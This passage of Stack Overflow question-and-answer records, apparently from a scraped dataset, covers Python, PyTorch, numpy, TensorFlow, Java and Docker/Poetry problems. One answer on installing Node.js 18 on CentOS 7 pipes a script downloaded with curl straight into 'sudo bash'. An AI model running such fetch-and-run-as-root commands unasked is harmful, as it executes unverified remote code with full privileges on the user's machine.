    "Body": "I've two PyTorch tensors\nmask = torch.ones(1024, 64, dtype=torch.float32)\nindices = torch.randint(0, 64, (1024, ))\n\nFor every ith row in mask, I want to set all the elements after the index specified by ith element of indices to zero. For example, if the first element of indices is 50, then I want to set mask[0, 50:]=0. Is it possible to achieve this without using for loop?\nSolution with for loop:\nfor i in range(mask.shape[0]):\n    mask[i, indices[i]:] = 0\n\n",
    "AcceptedAnswerId": 73326058,
    "AcceptedAnswer": "You can first generate a tensor of size (1024x64) where each row has numbers arranged from 0 to 63. Then apply a logical operation using the indices reshaped as (1024x1)\nmask = torch.ones(1024, 64, dtype=torch.float32)\nindices = torch.randint(0, 64, (1024, 1))    # Note the dimensions\n\nmask[torch.arange(0, 64, dtype=torch.float32).repeat(1024,1) >= indices] = 0\n\n"
}
{
    "Id": 72571235,
    "PostTypeId": 1,
    "Title": "Can I install node.js 18 on Centos 7 and do I need python 3 install too?",
    "Body": "I'm not sure if node.js 18 supports centos 7 and is it a requirement to install python 3 for node.js 18?\n",
    "AcceptedAnswerId": 72571789,
    "AcceptedAnswer": "Step 1 - curl --silent --location https://rpm.nodesource.com/setup_18.x | sudo bash -\nStep 2 - sudo yum -y install nodejs\nI don't think you need Python 3.\nReference - https://computingforgeeks.com/install-node-js-on-centos-rhel-rocky-linux/\n"
}
{
    "Id": 72280047,
    "PostTypeId": 1,
    "Title": "How can I override a special method defined in a metaclass with a custom classmethod?",
    "Body": "As an example, consider the following:\nclass FooMeta(type):\n    def __len__(cls):\n        return 9000\n\n\nclass GoodBar(metaclass=FooMeta):\n    def __len__(self):\n        return 9001\n\n\nclass BadBar(metaclass=FooMeta):\n    @classmethod\n    def __len__(cls):\n        return 9002\n\nlen(GoodBar) -> 9000\nlen(GoodBar()) -> 9001\nGoodBar.__len__() -> TypeError (missing 1 required positional argument)\nGoodBar().__len__() -> 9001\nlen(BadBar) -> 9000 (!!!)\nlen(BadBar()) -> 9002\nBadBar.__len__() -> 9002\nBadBar().__len__() -> 9002\n\nThe issue being with len(BadBar) returning 9000 instead of 9002 which is the intended behaviour.\nThis behaviour is (somewhat) documented in Python Data Model - Special Method Lookup, but it doesn't mention anything about classmethods, and I don't really understand the interaction with the @classmethod decorator.\nAside from the obvious metaclass solution (ie, replace/extend FooMeta) is there a way to override or extend the metaclass function so that len(BadBar) -> 9002?\nEdit:\nTo clarify, in my specific use case I can't edit the metaclass, and I don't want to subclass it and/or make my own metaclass, unless it is the only possible way of doing this.\n",
    "AcceptedAnswerId": 72281211,
    "AcceptedAnswer": "The __len__ defined in the class will always be ignored when using len(...) for the class itself:  when executing its operators, and methods like \"hash\", \"iter\", \"len\" can be roughly said to have \"operator status\", Python always retrieve the corresponding method from the class of the target,  by directly acessing the memory structure of the class. These dunder methods have \"physical\" slot in the memory layout for the class: if the method exists in the class of your instance (and in this case, the \"instances\" are the classes \"GoodBar\" and \"BadBar\", instances of \"FooMeta\"), or one of its superclasses, it is called - otherwise the operator fails.\nSo, this is the reasoning that applies on len(GoodBar()): it will call the __len__ defined in GoodBar()'s class, and len(GoodBar) and len(BadBar) will call the __len__ defined in their class, FooMeta\n\nI don't really understand the interaction with the @classmethod\ndecorator.\n\nThe \"classmethod\" decorator creates a special descriptor out of the decorated function, so that when it is retrieved, via \"getattr\" from the class it is bound too, Python creates a \"partial\" object with the \"cls\" argument already in place. Just as retrieving an ordinary method from an instance creates an object with \"self\" pre-bound:\nBoth things are carried through the \"descriptor\" protocol - which means, both an ordinary method and a classmethod are retrieved by calling its __get__ method. This method takes 3 parameters: \"self\", the descriptor itself, \"instance\", the instance its bound to, and \"owner\": the class it is ound to. The thing is that for ordinary methods (functions), when the second (instance) parameter to __get__ is None, the function itself is returned. @classmethod wraps a function with an object with a different __get__: one that returns the equivalent to partial(method, cls), regardless of the second parameter to __get__.\nIn other words, this simple pure Python code replicates the working of the classmethod decorator:\nclass myclassmethod:\n    def __init__(self, meth):\n         self.meth = meth\n    def __get__(self, instance, owner):\n         return lambda *args, **kwargs: self.meth(owner, *args, **kwargs)\n\nThat is why you see the same behavior when calling a classmethod explicitly with klass.__get__() and klass().__get__(): the instance is ignored.\nTL;DR: len(klass)  will always go through the metaclass slot, and klass.__len__() will retrieve __len__  via the getattr mechanism, and then bind the classmethod properly before calling it.\n\nAside from the obvious metaclass solution (ie, replace/extend FooMeta)\nis there a way to override or extend the metaclass function so that\nlen(BadBar) -> 9002?\n\n\n(...)\nTo clarify, in my specific use case I can't edit the metaclass, and I\ndon't want to subclass it and/or make my own metaclass, unless it is\nthe only possible way of doing this.\n\nThere is no other way. len(BadBar) will always go through the metaclass __len__.\nExtending the metaclass might not be all that painful, though.\nIt can be done with a simple call to type passing the new __len__ method:\nIn [13]: class BadBar(metaclass=type(\"\", (FooMeta,), {\"__len__\": lambda cls:9002})):\n    ...:     pass\n    \n\nIn [14]: len(BadBar)\nOut[14]: 9002\n\nOnly if BadBar will later be combined in multiple inheritance with another class hierarchy with a different custom metaclass you will have to worry. Even if there are other classes that have FooMeta as metaclass, the snippet above will work: the dynamically created metaclass will be the metaclass for the new subclass, as the \"most derived subclass\".\nIf however, there is a hierarchy of subclasses and they have differing metaclasses, even if created by this method, you will have to combine both metaclasses in a common subclass_of_the_metaclasses before creating the new  \"ordinary\" subclass.\nIf that is the case, note that you can have one single paramtrizable metaclass, extending your original one (can't dodge that, though)\nclass SubMeta(FooMeta):\n    def __new__(mcls, name, bases, ns, *,class_len):\n         cls = super().__new__(mcls, name, bases, ns)\n         cls._class_len = class_len\n         return cls\n\n    def __len__(cls):\n        return cls._class_len if hasattr(cls, \"_class_len\") else super().__len__()\n\nAnd:\n\nIn [19]: class Foo2(metaclass=SubMeta, class_len=9002): pass\n\nIn [20]: len(Foo2)\nOut[20]: 9002\n\n\n"
}
{
    "Id": 72621273,
    "PostTypeId": 1,
    "Title": "Numba parallelization with prange is slower when used more threads",
    "Body": "I tried a simple code to parallelize a loop with numba and prange. But for some reason when I use more threads instead of going faster it gets slower. Why is this happening? (cpu ryzen 7 2700x 8 cores 16 threads 3.7GHz)\nfrom numba import njit, prange,set_num_threads,get_num_threads\n@njit(parallel=True,fastmath=True)\ndef test1():\n    x=np.empty((10,10))\n    for i in prange(10):\n        for j in range(10):\n            x[i,j]=i+j\n\nNumber of threads : 1\n897 ns \u00b1 18.3 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 2\n1.68 \u00b5s \u00b1 262 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 3\n2.4 \u00b5s \u00b1 163 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 4\n4.12 \u00b5s \u00b1 294 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 5\n4.62 \u00b5s \u00b1 283 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 6\n5.01 \u00b5s \u00b1 145 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 7\n5.52 \u00b5s \u00b1 194 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 8\n4.85 \u00b5s \u00b1 140 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 9\n6.47 \u00b5s \u00b1 348 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 10\n6.88 \u00b5s \u00b1 120 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 11\n7.1 \u00b5s \u00b1 154 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 12\n7.47 \u00b5s \u00b1 159 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 13\n7.91 \u00b5s \u00b1 160 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 14\n9.04 \u00b5s \u00b1 472 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 15\n9.74 \u00b5s \u00b1 581 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 16\n11 \u00b5s \u00b1 967 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\n\n",
    "AcceptedAnswerId": 72621564,
    "AcceptedAnswer": "This is totally normal. Numba needs to create threads and distribute the work between them so they can execute the computation in parallel. Numba can use different threading backends. The default if generally OpenMP and the default OpenMP implementation should be IOMP (OpenMP runtime of ICC/Clang) which try to create threads only once. Still, sharing the work between threads is far slower than iterating over 100 values. A modern mainstream processor should be able to execute the 2 nested loops in sequential in less than 0.1-0.2 us. Numba should also be able to unroll the two loops. The Numba function overhead is also generally about few hundreds of nanoseconds. The allocation of the Numpy array should be far slower than the actual loops. Additionally, there are other overheads causing this code to be significantly slower with multiple threads even if the previous overhead would be negligible. For example, false-sharing causes the writes to be mostly serialized and thus slower than if they would be done one 1 unique threads (because of a cache line bouncing effect operating on the LLC on x86-64 platforms).\nNote that the time to create a thread is generally significantly more than 1 us because a system call is required.\nPut it shortly: use threads when the work to do is big enough and can be efficiently parallelized.\n"
}
{
    "Id": 72561628,
    "PostTypeId": 1,
    "Title": "Why such a big pickle of a sklearn decision tree (30K times bigger)?",
    "Body": "Why pickling a sklearn decision tree can generate a pickle thousands times bigger (in terms of memory) than the original estimator?\nI ran into this issue at work where a random forest estimator (with 100 decision trees) over a dataset with around 1_000_000 samples and 7 features generated a pickle bigger than 2GB.\nI was able to track down the issue to the pickling of a single decision tree and I was able to replicate the issue with a generated dataset as below.\nFor memory estimations I used pympler library. Sklearn version used is 1.0.1\n# here using a regressor tree but I would expect the same issue to be present with a classification tree\nimport pickle\nfrom sklearn.tree import DecisionTreeRegressor\nfrom sklearn.datasets import make_friedman1  # using a dataset generation function from sklear\nfrom pympler import asizeof\n\n# function that creates the dataset and trains the estimator\ndef make_example(n_samples: int):\n    X, y = make_friedman1(n_samples=n_samples, n_features=7, noise=1.0, random_state=49)\n    estimator = DecisionTreeRegressor(max_depth=50, max_features='auto', min_samples_split=5)\n    estimator.fit(X, y)\n    return X, y, estimator\n\n# utilities to compute and compare the size of an object and its pickled version\ndef readable_size(size_in_bytes: int, suffix='B') -> str:\n    num = size_in_bytes\n    for unit in ['', 'k', 'M', 'G', 'T', 'P', 'E', 'Z']:\n        if abs(num) < 1024.0:\n            return \"%3.1f %s%s\" % (num, unit, suffix)\n        num /= 1024.0\n    return \"%.1f%s%s\" % (num, 'Yi', suffix)\n\ndef print_size(obj, skip_detail=False):\n    obj_size = asizeof.asized(obj).size\n    print(readable_size(obj_size))\n    return obj_size\n\ndef compare_with_pickle(obj):\n    size_obj = print_size(obj)\n    size_pickle = print_size(pickle.dumps(obj))\n    print(f\"Ratio pickle/obj: {(size_pickle / size_obj):.2f}\")\n    \n_, _, model100K = make_example(100_000)\ncompare_with_pickle(model100K)\n_, _, model1M = make_example(1_000_000)\ncompare_with_pickle(model1M)\n\noutput:\n1.7 kB\n4.9 MB\nRatio pickle/obj: 2876.22\n1.7 kB\n49.3 MB\nRatio pickle/obj: 28982.84\n\n",
    "AcceptedAnswerId": 72633003,
    "AcceptedAnswer": "As pointed out by @pygeek's answer and subsequent comments, the wrong assumption of the question is that the pickle is increasing the size of the object substantially. Instead the issue lies with pympler.asizeof which is not giving the correct estimate of the tree object.\nIndeed the DecisionTreeRegressor object has a tree_ attribute that has a number of arrays of length tree_.node_count. Using help(sklearn.tree._tree.Tree) we can see that there are 8 such arrays (values, children_left, children_right, feature, impurity, threshold, n_node_samples, weighted_n_node_samples) and the underlying type of every array (except possibly the values array, see note below) should be an underlying 64 bit integer or 64 bit float (the underlying Tree object is a cython object), so a better estimate of the size of a DecisionTree is estimator.tree_.node_count*8*8.\nComputing this estimate for the models above:\ndef print_tree_estimate(tree):\n    print(f\"A tree with max_depth {tree.max_depth} can have up to {2**(tree.max_depth -1)} nodes\")\n    print(f\"This tree has node_count {tree.node_count} and a size estimate is {readable_size(tree.node_count*8*8)}\")\n    \nprint_tree_estimate(model100K.tree_)\nprint()\nprint_tree_estimate(model1M.tree_)\n\ngives as output:\nA tree with max_depth 37 can have up to 68719476736 nodes\nThis tree has node_count 80159 and a size estimate is 4.9 MB\n\nA tree with max_depth 46 can have up to 35184372088832 nodes\nThis tree has node_count 807881 and a size estimate is 49.3 MB\n\nand indeed these estimates are in line with the sizes of pickle objects.\nFurther note that the only way to be sure to bound the size of DecisionTree is to bound max_depth, since a binary tree can have a maximum number of nodes that is bounded by 2**(max_depth - 1), but the specific tree realizations above have a number of nodes well below this theoretical bound.\nnote: the above estimate is valid for this decision tree regressor which has a single output and no classes. estimator.tree_.values is an array of shape [node_count, n_outputs, max_n_classes] so for n_outputs > 1 and/or max_n_classes > 1 the size estimate would need to take into account those and the correct estimate would be estimator.tree_.node_count*8*(7 + n_outputs*max_n_classes)\n"
}
{
    "Id": 72255562,
    "PostTypeId": 1,
    "Title": "Cannot import name 'dtensor' from 'tensorflow.compat.v2.experimental'",
    "Body": "I am having problems trying to run TensorFlow on my Windows 10 machine. Code runs fine on my MacOS machine.\nTraceback (most recent call last):\n  File \"c:\\Users\\Fynn\\Documents\\GitHub\\AlpacaTradingBot\\ai.py\", line 15, in \n    from keras.models import Sequential, load_model\n  File \"C:\\Users\\Fynn\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\keras\\__init__.py\", line 24, in \n    from keras import models\n  File \"C:\\Users\\Fynn\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\keras\\models\\__init__.py\", line 18, in \n    from keras.engine.functional import Functional\n  File \"C:\\Users\\Fynn\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\keras\\engine\\functional.py\", line 24, in \n    from keras.dtensor import layout_map as layout_map_lib\n  File \"C:\\Users\\Fynn\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\keras\\dtensor\\__init__.py\", line 22, in \n    from tensorflow.compat.v2.experimental import dtensor as dtensor_api  # pylint: disable=g-import-not-at-top\nImportError: cannot import name 'dtensor' from 'tensorflow.compat.v2.experimental' (C:\\Users\\Fynn\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\tensorflow\\_api\\v2\\compat\\v2\\experimental\\__init__.py)\n\n",
    "AcceptedAnswerId": 72336599,
    "AcceptedAnswer": "I tried many solutions to no avail, in the end this worked for me!\npip3 uninstall tensorflow absl-py astunparse flatbuffers gast google-pasta grpcio h5py keras keras-preprocessing libclang numpy opt-einsum protobuf setuptools six tensorboard tensorflow-io-gcs-filesystem termcolor tf-estimator-nightly typing-extensions wrapt\n\npip3 install --disable-pip-version-check --no-cache-dir tensorflow\n\n"
}
{
    "Id": 73336136,
    "PostTypeId": 1,
    "Title": "Does having a wrapper object return value (e.g. Integer) cause auto boxing in Java?",
    "Body": "I couldn't find a definitive answer for this seemingly simple question. If I write a method like this:\npublic Integer getAnInt() {\n  int[] i = {4};\n  return i[0];\n}\n\nis the return value autoboxed into an Integer, or does it depend on what happens to the value after it's returned (e.g. whether the variable it is assigned to is declared as an Integer or int)?\n",
    "AcceptedAnswerId": 73336170,
    "AcceptedAnswer": "Yes, boxed\nIt will be (auto)boxed in the bytecode (.class file) because it's part of the public API, so other code might depend on the return value being an Integer.\nThe boxing and unboxing might be removed at runtime by the JITter under the right circumstances, but I don't know if it does that sort of thing.\n"
}
{
    "Id": 73344242,
    "PostTypeId": 1,
    "Title": "Converting float32 to float64 takes more than expected in numpy",
    "Body": "I had a performance issue in a numpy project and then I realized that about 3 fourth of the execution time is wasted on a single line of code:\nerror = abs(detected_matrix[i, step] - original_matrix[j, new])\nand when I have changed the line to\nerror = abs(original_matrix[j, new] - detected_matrix[i, step])\nthe problem has disappeared.\nI relized that the type of original_matrix was float64 and type of detected_matrix was float32. By changing types of either of these two varibles the problem solved.\nI was wondering that if this is a well known issue?\nHere is a sample code that represents the problem\nfrom timeit import timeit\nimport numpy as np\n\nf64 = np.array([1.0], dtype='float64')[0]\nf32 = np.array([1.0], dtype='float32')[0]\n\ntimeit_result = timeit(stmt=\"abs(f32 - f64)\", number=1000000, globals=globals())\nprint(timeit_result)\n\n\ntimeit_result = timeit(stmt=\"abs(f64 - f32)\", number=1000000, globals=globals())\nprint(timeit_result)\n\nOutput in my computer:\n2.8707289\n0.15719420000000017\n\nwhich is quite strange.\n",
    "AcceptedAnswerId": 73346327,
    "AcceptedAnswer": "TL;DR: Please use Numpy >= 1.23.0.\nThis problem has been fixed in Numpy 1.23.0 (more specifically the version 1.23.0-rc1). This pull request rewrites the scalar math logic so to make it faster in many cases including in your specific use-case. With version 1.22.4, the former code is 10 times slower than the second one. This is also true for earlier versions like the 1.21.5. In the 1.23.0, the former is only 10%-15% slower but both takes a very small time: 140 ns/operation versus 122 ns/operation. The small difference is due to a slightly different path taken in the type-checking part of the code. For more information about this low-level behavior, please read this post. Note that iterating over Numpy items it not meant to be very fast, nor operating on Numpy scalar. If your code is limited by that, please consider converting Numpy scalar into Python ones as stated in the 1.23.0 release notes:\n\nMany operations on NumPy scalars are now significantly faster, although\nrare operations (e.g. with 0-D arrays rather than scalars) may be slower\nin some cases. However, even with these improvements users who want the\nbest performance for their scalars, may want to convert a known NumPy\nscalar into a Python one using scalar.item().\n\nAn even faster solution is to use Numba/Cython in this case or just to try to vectorize the encompassing loop if possible.\n"
}
{
    "Id": 72363601,
    "PostTypeId": 1,
    "Title": "How to interpret the \"Package would be ignored\" warning generated by setuptools?",
    "Body": "I work on several python packages that contain data within them. I add them via the MANIFEST.in file, passing include_package_data=True to setup. For example:\n# MANIFEST.in\ngraft mypackage/plugins\ngraft mypackage/data\n\nUp to now, this has worked without warnings as far as I know. However, in setuptools 62.3.0, I get the following message:\nSetuptoolsDeprecationWarning:     Installing 'mypackage.plugins' as data is deprecated, please list it in `packages`.\n07:53:53     !!\n07:53:53 \n07:53:53 \n07:53:53     ############################\n07:53:53     # Package would be ignored #\n07:53:53     ############################\n07:53:53     Python recognizes 'mypackage.plugins' as an importable package, however it is\n07:53:53     included in the distribution as \"data\".\n07:53:53     This behavior is likely to change in future versions of setuptools (and\n07:53:53     therefore is considered deprecated).\n07:53:53 \n07:53:53     Please make sure that 'mypackage.plugins' is included as a package by using\n07:53:53     setuptools' `packages` configuration field or the proper discovery methods\n07:53:53     (for example by using `find_namespace_packages(...)`/`find_namespace:`\n07:53:53     instead of `find_packages(...)`/`find:`).\n07:53:53 \n07:53:53     You can read more about \"package discovery\" and \"data files\" on setuptools\n07:53:53     documentation page.\n\nI get the above warning for pretty much every directory within mypackage that contains data and is included by MANIFEST.in.\nMy goal is to include arbitrary data (which could even include python files in the case of a plugin interface) in a package so that it can be accessed by users who install via wheel or tarball. I would also like that applications built by, e.g., pyinstaller, that pull my package in can easily collect the data with collect_data_files, which for me has worked without any additional setup with the current methodology.\nWhat is the proper way to do this going forward?\n",
    "AcceptedAnswerId": 72660189,
    "AcceptedAnswer": "The TL;DR is that in Python since PEP 420, directories count as packages, even if they don't have a __init__.py file.\nThe main difference is that directories without __init__.py are called \"namespace packages\".\nAccordingly, if a project wants to distribute directories without a __init__.py file, it should use packages=find_namespace_packages() (setup.py) or packages = find_namespace: (setup.cfg). Details on how to use those tools can be found on these docs. Doing this change should make the error go away.\nThe MANIFEST.in or the include_package_data=True should be fine.\n"
}
{
    "Id": 72034176,
    "PostTypeId": 1,
    "Title": "adjust the size of the text label in plotly",
    "Body": "Im trying to adjust the text size accoridng to country size, so the text will be inside the boardes of the copuntry.\nimport pandas as pd\nimport plotly.express as px\n\ndf=pd.read_csv('regional-be-daily-latest.csv', header = 1)\n\nfig = px.choropleth(df, locations='Code', color='Track Name')\nfig.update_layout(margin={\"r\":0,\"t\":0,\"l\":0,\"b\":0})\n\nfig.add_scattergeo(\n\n  locations = df['Code'],\n  text = df['Track Name'],\n  mode = 'text',\n)\n\nfig.show()\n\nFor the visualiztion:\n\nThe text for orange country is inside the boardes of the country but the text to label the blue countrry is bigger.\nBest would be to adjust the size so it will not exceed the boardes of the country\n",
    "AcceptedAnswerId": 72034697,
    "AcceptedAnswer": "You can set the font size using the update_layout function and specifying the font's size by passing the dictionary in the font parameter.\nimport pandas as pd\nimport plotly.express as px\n\ndf=pd.read_csv('regional-be-daily-latest.csv', header = 1)\n\nfig = px.choropleth(df, locations='Code', color='Track Name')\nfig.update_layout(margin={\"r\":0,\"t\":0,\"l\":0,\"b\":0})\n\nfig.add_scattergeo(\n\n  locations = df['Code'],\n  text = df['Track Name'],\n  mode = 'text',\n)\n\n\nfig.update_layout(\n    font=dict(\n        family=\"Courier New, monospace\",\n        size=18,  # Set the font size here\n        color=\"RebeccaPurple\"\n    )\n)\n\nfig.show()\n\n"
}
{
    "Id": 72411825,
    "PostTypeId": 1,
    "Title": "Jupyter notebook in vscode with virtual environment fails to import tensorflow",
    "Body": "I'm attempting to create an isolated virtual environment running tensorflow & tf2onnx using a jupyter notebook in vscode.\nThe tf2onnx packge recommends python 3.7, and my local 3.7.9 version usually works well with tensorflow projects, so I have local and global versions set to 3.7.9 using pyenv.\nThe following is my setup procedure:\npython -m venv .venv\nThen after starting a new terminal in vscode:\npip install tensorflow==2.7.0\npip freeze > requirements.txt\nAfter this, in a cell in my jupyter notebook, the following line fails\nimport tensorflow.keras as keras\n\nException:\n\nTypeError: Descriptors cannot not be created directly.\nIf this call came from a _pb2.py file, your generated code is out of date and must be \nregenerated with protoc >= 3.19.0.\nIf you cannot immediately regenerate your protos, some other possible workarounds are:\n1. Downgrade the protobuf package to 3.20.x or lower.\n2. Set PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python (but this will use pure-Python \nparsing and will be much slower).\n\n\nAt this point, the protobuf package version is showing as v4.21.0 in my requirements file.  I've attempted to pre-install the 3.20.1 version into the virtual environment before installing tensorflow but this yields no effect.\nHere is the full requirements file after installing tensorflow:\nabsl-py==1.0.0\nastunparse==1.6.3\ncachetools==5.1.0\ncertifi==2022.5.18.1\ncharset-normalizer==2.0.12\nflatbuffers==2.0\ngast==0.4.0\ngoogle-auth==2.6.6\ngoogle-auth-oauthlib==0.4.6\ngoogle-pasta==0.2.0\ngrpcio==1.46.3\nh5py==3.7.0\nidna==3.3\nimportlib-metadata==4.11.4\nkeras==2.7.0\nKeras-Preprocessing==1.1.2\nlibclang==14.0.1\nMarkdown==3.3.7\nnumpy==1.21.6\noauthlib==3.2.0\nopt-einsum==3.3.0\nprotobuf==4.21.0\npyasn1==0.4.8\npyasn1-modules==0.2.8\nrequests==2.27.1\nrequests-oauthlib==1.3.1\nrsa==4.8\nsix==1.16.0\ntensorboard==2.9.0\ntensorboard-data-server==0.6.1\ntensorboard-plugin-wit==1.8.1\ntensorflow==2.7.0\ntensorflow-estimator==2.7.0\ntensorflow-io-gcs-filesystem==0.26.0\ntermcolor==1.1.0\ntyping-extensions==4.2.0\nurllib3==1.26.9\nWerkzeug==2.1.2\nwrapt==1.14.1\nzipp==3.8.0\n\n",
    "AcceptedAnswerId": 72414640,
    "AcceptedAnswer": "A recent change in protobuf is causing TensorFlow to break. Downgrading before installing TensorFlow might not work because TensorFlow might be bumping up the version itself. Check if that is what happens during the installation.\nYou might want to either:\nDowngrade with\npip install --upgrade \"protobuf<=3.20.1\"\n\nafter installing TensorFlow, or\nUpgrade TensorFlow to the latest version, as TensorFlow has updated their setup file in their 2.9.1 release.\n"
}
{
    "Id": 72593814,
    "PostTypeId": 1,
    "Title": "Cannot import name 'soft_unicode' from 'markupsafe' in google colab",
    "Body": "I'm trying to install pycaret==3.0.0 in google colab, But I'm having a problem, the library requires Jinja2 to be installed which I did, but then It finally throws off another error.\nImportError                               Traceback (most recent call last)\n in ()\n----> 1 import jinja2\n      2 from pycaret.regression import *\n\n3 frames\n/usr/local/lib/python3.7/dist-packages/jinja2/filters.py in ()\n     11 from markupsafe import escape\n     12 from markupsafe import Markup\n---> 13 from markupsafe import soft_unicode\n     14 \n     15 from ._compat import abc\n\nImportError: cannot import name 'soft_unicode' from 'markupsafe' (/root/.local/lib/python3.7/site-packages/markupsafe/__init__.py)\n\n",
    "AcceptedAnswerId": 72834195,
    "AcceptedAnswer": "This is caused by upgrade in MarkupSafe:2.1.0 where they have removed soft_unicode, try using:\npip install markupsafe==2.0.1\n\n"
}
{
    "Id": 72452403,
    "PostTypeId": 1,
    "Title": "Cross-reference between numpy arrays",
    "Body": "I have a 1d array of ids, for example:\na = [1, 3, 4, 7, 9]\n\nThen another 2d array:\nb = [[1, 4, 7, 9], [3, 7, 9, 1]]\n\nI would like to have a third array with the same shape of b where each item is the index of the corresponding item from a, that is:\nc = [[0, 2, 3, 4], [1, 3, 4, 0]]\n\nWhat's a vectorized way to do that using numpy?\n",
    "AcceptedAnswerId": 72453076,
    "AcceptedAnswer": "Effectively, this solution is a one-liner. The only catch is that you need to reshape the array before you do the one-liner, and then reshape it back again:\nimport numpy as np\n\na = np.array([1, 3, 4, 7, 9])\nb = np.array([[1, 4, 7, 9], [3, 7, 9, 1]])\noriginal_shape = b.shape\n\nc = np.where(b.reshape(b.size, 1) == a)[1]\n\nc = c.reshape(original_shape)\n\nThis results with:\n[[0 2 3 4]\n [1 3 4 0]]\n\n"
}
{
    "Id": 72059380,
    "PostTypeId": 1,
    "Title": "Python fuctional style iterative algoritm?",
    "Body": "In Haskell there is a simple list function available\niterate :: (a -> a) -> a -> [a]\niterate f x =  x : iterate f (f x)\n\nIn python it could be implemented as following:\ndef iterate(f, init):\n  while True:\n    yield init\n    init = f(init)\n\nI was kinda surprised that something basic like this is not part of the functools/itertools modules. Could it be simply costructed in functional style (i.e. without the loop) using the tools provided in these libraries? (Mostly code golf, trying to learn about functional style in Python.)\n",
    "AcceptedAnswerId": 72059725,
    "AcceptedAnswer": "You can do it using some of the functions in itertools:\nfrom itertools import accumulate, repeat\n\ndef iterate(func, initial):\n    return accumulate(repeat(None), func=lambda tot, _: func(tot), initial=initial)\n\nAlthough it's clearly not very clean. Itertools is missing some fundamental functions for constructing streams, like unfoldr. Most of the itertools functions could be defined in terms of unfoldr, as it happens, but functional programming is a little uncomfortable in Python anyways so that might not be much of a benefit.\n"
}
{
    "Id": 72465421,
    "PostTypeId": 1,
    "Title": "How to use poetry with docker?",
    "Body": "How do I install poetry in my image? (should I use pip?)\nWhich version of poetry should I use?\nDo I need a virtual environment?\nThere are many examples and opinions in the wild which offer different solutions.\n",
    "AcceptedAnswerId": 72465422,
    "AcceptedAnswer": "TL;DR\nInstall poetry with pip, configure virtualenv, install dependencies, run your app.\nFROM python:3.10\n\n# Configure Poetry\nENV POETRY_VERSION=1.2.0\nENV POETRY_HOME=/opt/poetry\nENV POETRY_VENV=/opt/poetry-venv\nENV POETRY_CACHE_DIR=/opt/.cache\n\n# Install poetry separated from system interpreter\nRUN python3 -m venv $POETRY_VENV \\\n    && $POETRY_VENV/bin/pip install -U pip setuptools \\\n    && $POETRY_VENV/bin/pip install poetry==${POETRY_VERSION}\n\n# Add `poetry` to PATH\nENV PATH=\"${PATH}:${POETRY_VENV}/bin\"\n\nWORKDIR /app\n\n# Install dependencies\nCOPY poetry.lock pyproject.toml ./\nRUN poetry install\n\n# Run your app\nCOPY . /app\nCMD [ \"poetry\", \"run\", \"python\", \"-c\", \"print('Hello, World!')\" ]\n\nIn Detail\nInstalling Poetry\n\nHow do I install poetry in my image? (should I use pip?)\n\nInstall it with pip\nYou should install poetry with pip. but you need to isolate it from the system interpreter and the project's virtual environment.\n\nFor maximum control in your CI environment, installation with pip is fully supported ... offers the best debugging experience, and leaves you subject to the fewest external tools.\n\nENV POETRY_VERSION=1.2.0\nENV POETRY_VENV=/opt/poetry-venv\n\n# Install poetry separated from system interpreter\nRUN python3 -m venv $POETRY_VENV \\\n    && $POETRY_VENV/bin/pip install -U pip setuptools \\\n    && $POETRY_VENV/bin/pip install poetry==${POETRY_VERSION}\n\n# Add `poetry` to PATH\nENV PATH=\"${PATH}:${POETRY_VENV}/bin\"\n\nPoetry Version\n\nWhich version of poetry should I use?\n\nSpecify the latest stable version explicitly in your installation.\nForgetting to specify POETRY_VERSION will result in undeterministic builds, as the installer will always install the latest version - which may introduce breaking changes\nVirtual Environment (virtualenv)\n\nDo I need a virtual environment?\n\nYes, and you need to configure it a bit.\nENV POETRY_CACHE_DIR=/opt/.cache\n\nThe reasons for this are somewhat off topic:\n\n By default, poetry creates a virtual environment in $HOME/.cache/pypoetry/virtualenvs to isolate the system interpreter from your application. This is the desired behavior for most development scenarios. When using a container, the $HOME variable may be changed by certain runtimes, so creating the virtual environment in an independent directory solves any reproducibility issues that may arise.\n\nBringing It All Together\nTo use poetry in a docker image you need to:\n\nInstall your desired version of poetry\nConfigure virtual environment location\nInstall your dependencies\nUse poetry run python ... to run your application\n\nA Working Example:\nThis is a minimal flask project managed with poetry.\nYou can copy these contents to your machine to test it out (expect for poerty.lock)\nProject structure\npython-poetry-docker/\n|- Dockerfile\n|- app.py\n|- pyproject.toml\n|- poetry.lock\n\nDockerfile\nFROM python:3.10 as python-base\n\n# https://python-poetry.org/docs#ci-recommendations\nENV POETRY_VERSION=1.2.0\nENV POETRY_HOME=/opt/poetry\nENV POETRY_VENV=/opt/poetry-venv\n\n# Tell Poetry where to place its cache and virtual environment\nENV POETRY_CACHE_DIR=/opt/.cache\n\n# Create stage for Poetry installation\nFROM python-base as poetry-base\n\n# Creating a virtual environment just for poetry and install it with pip\nRUN python3 -m venv $POETRY_VENV \\\n    && $POETRY_VENV/bin/pip install -U pip setuptools \\\n    && $POETRY_VENV/bin/pip install poetry==${POETRY_VERSION}\n\n# Create a new stage from the base python 